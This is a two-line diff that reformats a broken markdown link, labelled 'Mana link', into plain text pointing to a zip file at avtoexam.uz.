@@ -1,1 +1,2 @@
-(Mana link)[http://avtoexam.uz/tg.zip]
+Mana link
+http://avtoexam.uz/tg.zip
